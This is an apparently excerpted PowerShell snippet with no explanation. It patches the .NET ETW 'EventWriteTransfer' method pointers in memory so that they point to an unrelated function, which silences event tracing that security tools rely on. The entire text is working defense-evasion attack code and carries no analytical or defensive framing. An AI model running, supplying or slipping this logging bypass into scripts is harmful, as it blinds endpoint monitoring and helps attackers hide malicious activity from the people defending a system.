$ptr2 = [Ref].Assembly.GetType('System.Management.Automation.ConsoleVisibility'). `
GetMethod('AllocConsole',$f).MethodHandle.GetFunctionPointer()
$m1   = [System.Object].Assembly.GetType('Microsoft.Win32.UnsafeNativeMethods'). `
GetNestedType('ManifestEtw',[Reflection.BindingFlags]'NonPublic'). `
GetMethods($f)|?{$_.Name -eq 'EventWriteTransfer'}|select -First 1
$m2   = [System.Linq.Enumerable].Assembly. `
GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethods($f)|?{$_.Name -eq ` 
'EventWriteTransfer'}|select -First 1
$o1   = 1..50|?{[Runtime.InteropServices.Marshal]::ReadIntPtr($m1.MethodHandle.Value, `
$_*8) -eq $m1.MethodHandle.GetFunctionPointer()}|select -First 1
$o2   = 1..50|?{[Runtime.InteropServices.Marshal]::ReadIntPtr($m2.MethodHandle.Value, `
$_*8) -eq $m2.MethodHandle.GetFunctionPointer()}|select -First 1
[Runtime.InteropServices.Marshal]::WriteIntPtr([IntPtr]($m1.MethodHandle.Value. `
ToInt64()+$o1*8),$ptr2)
[Runtime.InteropServices.Marshal]::WriteIntPtr([IntPtr]($m2.MethodHandle.Value. `
ToInt64()+$o2*8),$ptr2)
